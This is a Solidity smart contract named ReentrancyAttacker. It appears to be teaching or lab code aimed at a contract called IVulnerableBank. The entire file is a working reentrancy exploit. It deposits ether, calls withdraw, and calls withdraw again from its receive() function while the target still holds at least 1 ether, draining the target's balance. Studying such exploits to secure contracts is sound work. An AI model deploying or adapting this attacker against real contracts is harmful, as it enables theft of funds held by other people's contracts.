// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttacker {
    IVulnerableBank public target;

    constructor(address _target) public {
        target = IVulnerableBank(_target);
    }

    function attack() public payable {
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw();
        }
    }
}
